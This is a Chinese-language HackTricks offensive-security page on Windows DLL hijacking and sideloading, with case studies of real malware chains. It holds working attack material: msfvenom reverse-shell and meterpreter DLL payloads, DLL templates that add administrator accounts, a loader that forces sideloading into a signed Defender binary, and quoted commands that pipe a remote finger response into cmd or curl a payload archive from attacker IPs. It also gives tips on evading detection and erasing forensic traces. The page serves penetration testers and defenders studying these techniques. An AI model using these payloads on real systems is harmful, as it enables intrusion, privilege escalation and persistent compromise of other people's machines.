# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序去加载恶意 DLL。该术语包含多种策略，比如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久性，以及（不常见地）权限提升。尽管这里侧重于提升权限，劫持的方法在不同目标间是一致的。

### 常见技术

根据应用程序的 DLL 加载策略，存在几种被用来进行 DLL hijacking 的方法，每种方法的有效性不同：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，可选择使用 DLL Proxying 保持原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在比合法 DLL 更先被搜索到的路径中，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其误以为这是一个本不存在但被需要的 DLL。
4. **DLL Redirection**：修改搜索参数，例如 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件，将应用定向到恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关联。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与拷贝的应用程序一起、由用户控制的目录中，类似于 Binary Proxy Execution 技术。

> [!TIP]
> 如果想要逐步链，将 HTML staging、AES-CTR 配置和 .NET 植入与 DLL sideloading 层叠在一起，请查看下面的工作流。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dlls

查找系统内缺失 Dlls 的最常见方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置以下 2 个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你要查找**一般的缺失 dlls**，就让它运行**几秒钟**。\
如果你要查找某个**特定可执行文件内的缺失 dll**，你应该再设置一个过滤器，比如 "Process Name" "contains" `<exec name>`，执行该可执行文件，然后停止捕获事件。

## 利用缺失的 Dlls

为了提升权限，我们最好的机会是能够**写入一个有权限的进程会尝试加载的 dll**到某些**会被搜索到的位置**。因此，我们可以在一个**比原始 dll 所在文件夹更先被搜索到的文件夹**中**写入**一个 dll（罕见情况），或者在某些会被搜索的文件夹中写入（而原始 **dll** 在任何文件夹中都不存在）。

### Dll Search Order

在 [**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 DLL 的具体加载方式。

Windows 应用按照一组**预定义的搜索路径**以特定顺序查找 DLL。DLL hijacking 的问题出现在恶意 DLL 被放置在这些目录之一，从而确保其在真实 DLL 之前被加载。防止该问题的一种方法是确保应用在引用所需 DLL 时使用绝对路径。

下面可以看到 **32-bit** 系统上的 **DLL search order**：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。禁用时，当前目录会提升到第二位。要禁用此功能，请创建注册表值 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索从正在被 **LoadLibraryEx** 加载的可执行模块的目录开始。

最后，请注意 **一个 dll 也可能通过指示绝对路径而被加载，而不是仅通过名称**。在那种情况下，该 dll **只会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将像通过名称加载一样被搜索）。

还有其他方法可以改变搜索顺序，但这里不再详述。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种确定性影响新创建进程 DLL 搜索路径的高级方法是，在使用 ntdll 的本地 API 创建进程时设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在此处提供一个攻击者可控的目录，当目标进程按名称解析导入的 DLL（未使用绝对路径且未使用安全加载标志）时，可以被强制从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供指向你控制的文件夹的自定义 DllPath（例如，放置 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析期间参考所提供的 DllPath，从而在恶意 DLL 未与目标 EXE 同位置时也能可靠地进行 sideloading。

注意/限制
- 这影响被创建的子进程；它不同于 SetDllDirectory，SetDllDirectory 只影响当前进程。
- 目标必须通过名称导入或通过 LoadLibrary 加载 DLL（不能使用绝对路径，也不能使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能改变优先级。

最小 C 示例（ntdll、wide strings、简化错误处理）：

<details>
<summary>完整 C 示例: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作使用示例
- 将一个恶意的 xmllite.dll（导出所需函数或代理到真实 DLL）放入你的 DllPath 目录。
- 启动一个已签名的、已知会按名称查找 xmllite.dll 的二进制文件，使用上述方法。loader 会通过提供的 DllPath 解析 import 并 sideloads 你的 DLL。

这种技术已在 in-the-wild 中被观察到用于驱动多阶段 sideloading 链：初始的 launcher 会投放一个辅助 DLL，然后它会以自定义 DllPath 生成一个 Microsoft-signed、可被 hijack 的二进制，从而强制从暂存目录加载攻击者的 DLL。


#### 来自 Windows 文档的 DLL 搜索顺序例外情况

Windows 文档中记录了对标准 DLL 搜索顺序的若干例外：

- 当遇到一个与内存中已加载的 DLL 同名的 **DLL that shares its name with one already loaded in memory** 时，系统会绕过通常的搜索。系统会先检查重定向和 manifest，然后默认使用内存中已加载的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果某个 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其版本的 known DLL 及其任何依赖 DLL，**跳过搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果某个 **DLL 有依赖项**，对这些依赖 DLL 的搜索会按仅通过其 **module names** 指示的方式进行，无论最初的 DLL 是否是通过完整路径标识的。

### 提权

**要求**：

- 识别一个在 **不同权限** 下运行或将要运行的进程（用于横向或侧向移动），并且该进程 **缺少 DLL**。
- 确保对将要 **搜索 DLL** 的任意 **目录** 拥有 **写权限**。该位置可能是可执行文件所在目录或系统路径内的某个目录。

是的，这些前提条件比较难找到，因为 **默认情况下很难找到一个缺少 DLL 的有特权的可执行文件**，而且在系统路径文件夹上拥有写权限更是 **不常见**（默认情况下你不能）。但在配置错误的环境中这是可能的。\
如果你很幸运并满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是绕过 UAC**，你可能会在其中找到针对你所用 Windows 版本的 Dll hijacking 的 **PoC**（很可能只需更改你有写权限的文件夹路径）。

注意，你可以通过以下方式 **检查你在某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以使用以下命令检查可执行文件的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查你是否对 system PATH 中的任何文件夹具有写入权限。\
用于发现该漏洞的其他有趣自动化工具是 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果发现可利用的场景，成功利用的关键之一是**创建一个至少导出可执行文件将从中导入的所有函数的 dll**。另外，请注意 Dll Hijacking 在 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) 时非常有用。你可以在这篇专注于 dll hijacking 用于执行的研究中找到一个关于 **如何创建有效 dll** 的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)。\
此外，在**下一节**中你可以找到一些**基础 dll 代码**，可作为**模板**或用于创建一个**导出非必需函数的 dll**。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个能够在加载时**执行你的恶意代码**，同时还能通过**将所有调用转发给真实库**来**暴露**并像**预期**那样**工作**的 Dll。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以**指定一个可执行文件并选择要代理的库**，然后**生成一个被代理的 dll**，或者**指定该 Dll**并**生成被代理的 dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户 (x86 我没看到 x64 版本)：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自定义

注意，在若干情况下，你编译的 Dll 必须 **export several functions**，这些函数将被 victim process 加载；如果这些函数不存在，**binary won't be able to load** 它们，**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（创建用户）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 在启动时仍会探测一个可预测的、按语言区分的 localization DLL，该 DLL 可被劫持以实现 arbitrary code execution 和 persistence。

关键事实
- 探测路径（当前构建）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 遗留路径（较早构建）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 如果在 OneCore 路径存在可写且由攻击者控制的 DLL，它会被加载并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要任何导出。

使用 Procmon 发现
- 筛选：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静默
- 一个简单的 hijack 会 speak/highlight UI。为保持安静，在 attach 时枚举 Narrator 线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并对其执行 `SuspendThread`；在你自己的线程中继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述配置，启动 Narrator 会加载已植入的 DLL。在安全桌面（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面以 SYSTEM 身份执行。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面以 SYSTEM 身份执行。
- 当 RDP 会话关闭时执行会停止——请及时注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表条目（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这会在 Accessibility 框架下代理任意执行。

Notes
- 在 `%windir%\System32` 下写入和更改 HKLM 值 需要管理员权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；无需导出函数。

## 案例研究：CVE-2025-1729 - 使用 TPQMAssistant.exe 的权限提升

本案例演示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，编号为 **CVE-2025-1729**。

### 漏洞细节

- **Component**: `TPQMAssistant.exe` 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天上午 9:30 在已登录用户的上下文中运行。
- **Directory Permissions**: 可被 `CREATOR OWNER` 写入，允许本地用户放置任意文件。
- **DLL Search Behavior**: 会优先尝试从其工作目录加载 `hostfxr.dll`，如果缺失会记录 "NAME NOT FOUND"，表明本地目录搜索具有优先性。

### 利用实现

攻击者可以将恶意的 `hostfxr.dll` 存根放在相同目录中，利用该缺失的 DLL 实现在用户上下文下的代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为普通用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于上午 9:30 运行。
3. 如果在任务执行时管理员已登录，恶意 DLL 将在管理员会话中以中等完整性级别运行。
4. 链式使用标准 UAC bypass 技术，将权限从中等完整性提升为 SYSTEM 权限。

## 案例研究: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者经常将 MSI-based droppers 与 DLL side-loading 结合，以在受信任的签名进程下执行 payload。

Chain overview
- 用户下载 MSI。A CustomAction 在 GUI 安装期间静默运行（例如 LaunchApplication 或 VBScript 动作），从嵌入资源重构下一阶段。
- The dropper 将一个合法签名的 EXE 和一个恶意 DLL 写入同一目录（example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当签名的 EXE 被启动时，Windows DLL 搜索顺序会优先从工作目录加载 wsc.dll，从而在签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction 表：
- 查找运行可执行文件或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/分割 payload：
- 以管理员方式提取：msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi：lessmsi x package.msi C:\out
- 查找多个小片段，这些片段由 VBScript CustomAction 连接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 进行实用 sideloading
- 将这两个文件放在同一文件夹中:
- wsc_proxy.exe: legitimate signed host (Avast). The process attempts to load wsc.dll by name from its directory.
- wsc.dll: attacker DLL. 如果不需要特定的 exports，DllMain 就足够；否则，构建一个 proxy DLL，并在 DllMain 中运行 payload 的同时将所需的 exports 转发到 genuine library。
- 构建一个最小的 DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出需求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须考虑这些因素。

## 签名三件组 + 加密 payload（ShadowPad 个案研究）

Check Point 描述了 Ink Dragon 如何使用一个 **三文件三件组** 来伪装成合法软件，同时在磁盘上保持核心 payload 的加密：

1. **Signed host EXE** – 利用诸如 AMD、Realtek 或 NVIDIA 的厂商二进制（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者重命名可执行文件以看起来像 Windows 二进制（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **Malicious loader DLL** – 放在 EXE 同目录下并使用预期名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是使用 ScatterBrain 框架混淆的 MFC 二进制；其唯一任务是定位加密 blob、解密并以 reflectively map 的方式映射 ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 存放在相同目录。loader 在对解密后的 payload 进行内存映射后会删除 TMP 文件以销毁取证证据。

实战要点：

* 重命名已签名的 EXE（同时在 PE header 中保留原始的 `OriginalFileName`）可以使其伪装成 Windows 二进制但仍保留厂商签名，因此可模仿 Ink Dragon 的做法，投放看起来像 `conhost.exe` 的二进制，其实是 AMD/NVIDIA 的工具。
* 由于可执行文件保持受信任状态，大多数 allowlisting 控制只需你的恶意 DLL 与之并置即可。重点定制 loader DLL；签名的父程序通常可不做修改直接运行。
* ShadowPad 的解密器期望 TMP blob 与 loader 同目录并可写，以便在映射后将文件清零。保持目录在 payload 加载前可写；一旦 payload 在内存中，TMP 文件可为 OPSEC 安全地删除。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

运营者将 DLL sideloading 与 LOLBAS 结合，使磁盘上唯一的自定义工件是放在受信任 EXE 旁的恶意 DLL：

- **Remote command loader (Finger):** 隐蔽的 PowerShell 启动 `cmd.exe /c`，从 Finger 服务器拉取命令并通过管道传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 拉取 TCP/79 文本；`| cmd` 执行服务器响应，使运营者可以旋转第二阶段的服务器端。

- **Built-in download/extract:** 下载一个带良性扩展名的归档，解包，并在随机的 `%LocalAppData%` 文件夹下部署 sideload 目标和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 隐藏进度并跟随重定向；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，使遥测显示为由 CIM 创建的进程，同时它加载同目录的 DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好本地 DLL 的二进制（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）在受信任的名称下运行。

- **Hunting:** 当 `/p`、`/m` 与 `/c` 同时出现在 `forfiles` 时触发告警；这种组合在管理脚本之外并不常见。


## 案例研究: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

近期的 Lotus Blossom 入侵滥用受信任的更新链，投放了一个 NSIS 打包的 dropper，随后部署了 DLL sideload 并实现了完全内存化的 payload。

攻击流程
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个重命名的 Bitdefender Submission Wizard `BluetoothService.exe`、一个恶意 `log.dll` 和一个加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 对 blob 进行 mmap 加载；`LogWrite` 使用自定义基于 LCG 的流对其解密（常数 **0x19660D** / **0x3C6EF35F**，密钥材料源自先前的哈希），将缓冲区覆盖为明文 shellcode，释放临时变量并跳转执行。
- 为避免 IAT，loader 通过对导出名应用散列来解析 API，使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**，然后应用类似 Murmur 的 avalanche（**0x85EBCA6B**），并与加盐后的目标哈希比较。

主要 shellcode (Chrysalis)
- 通过对密钥 `gQ2JR&9;` 进行五次迭代的加/异或/减重复操作来解密一个类 PE 主模块，然后动态加载 `Kernel32.dll` → `GetProcAddress` 完成导入解析。
- 在运行时通过逐字符的位旋转/异或变换重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个解析器遍历 **PEB → InMemoryOrderModuleList**，以 4 字节块和类似 Murmur 的混合解析每个导出表，只有在未找到哈希时才回退到 `GetProcAddress`。

嵌入的配置与 C2
- 配置位于投放的 `BluetoothService` 文件内，偏移 **offset 0x30808**（大小 **0x980**），并使用 RC4 与密钥 `qwhvb^435h&*7` 解密，揭示 C2 URL 和 User-Agent。
- 信标构建一个以点分隔的主机配置文件，前置标签 `4Q`，然后在通过 HTTPS 调用 `HttpSendRequestA` 前用 RC4（密钥 `vAuig34%^325hGV`）加密。响应经 RC4 解密后由标签分支调度（`4T` shell，`4V` 进程执行，`4W/4X` 文件写入，`4Y` 读取/外传，`4\\` 卸载，`4` 驱动/文件枚举 + 分块传输等）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run 键）指向 `-i`；`-i` 以 `-k` 重启自身；`-k` 跳过安装并运行 payload。

观察到的替代 loader
- 同一次入侵投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 下执行 `svchost.exe -nostdlib -run conf.c`，旁边放有 `libtcc.dll`。攻击者提供的 C 源码嵌入了 shellcode，编译后以内存方式运行，未生成磁盘上的 PE。可通过下述方式复现：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 这个基于 TCC 的 compile-and-run 阶段在运行时导入了 `Wininet.dll`，并从硬编码的 URL 拉取了第二阶段 shellcode，从而提供了一个伪装成编译器运行的灵活 loader。

## 参考资料

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
